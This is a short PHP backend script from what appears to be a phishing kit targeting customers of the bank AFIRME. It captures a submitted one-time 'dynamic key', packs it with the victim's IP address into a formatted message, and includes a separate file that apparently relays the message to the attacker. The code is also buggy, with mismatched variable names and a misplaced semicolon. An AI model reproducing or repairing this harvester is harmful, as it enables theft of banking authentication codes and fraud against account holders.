<?php  

	$dina=$_POST['dina'];
  


	$Enviara ="➖➖➖➖[ AFIRME ]➖➖➖➖\n".
  "<b>✔️Clave Dinamica 1: </b>  <code>".$dina."</code>\n".

  
  

  "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_idd1.php';
?>
